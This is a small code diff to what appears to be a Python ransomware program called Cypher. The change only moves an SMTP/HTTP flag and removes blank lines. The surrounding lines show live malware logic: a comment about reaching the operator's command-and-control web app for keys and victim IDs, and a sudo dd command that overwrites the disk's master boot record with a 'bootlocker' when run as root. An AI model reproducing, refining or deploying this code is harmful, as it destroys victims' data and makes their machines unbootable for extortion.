@@ -19,15 +19,13 @@ from Crypto.Cipher import AES
 from Crypto.PublicKey import RSA
 from multiprocessing import Pool
 
-# If SMTP == False, HTTP will be used to contact Cypher's C2 web app, request key and post ID. Should the operator prefer
-SMTP = True
-
 # Function to generate our client ID
 def gen_client_ID(size=12, chars=string.ascii_uppercase + string.digits):
 	return ''.join(random.choice(chars) for _ in range(size))
 
+# If SMTP == False, HTTP will be used to contact Cypher's C2 web app, request key and post ID. Should the operator prefer
+SMTP = True
 ID = gen_client_ID(12)
-
 
 # Check to see if we're on linux and have root, if so use dd to override the MBR with our bootlocker.
 if sys.platform == 'linux2' and gp.getuser() == 'root':
@@ -40,7 +38,6 @@ else:
 		os.system("sudo dd if=boot.bin of=/dev/hda bs=512 count=1 && exit")
 	except:
 		pass
-
 
 def Key_Ops_HTTP():
 	br = mechanize.Browser()
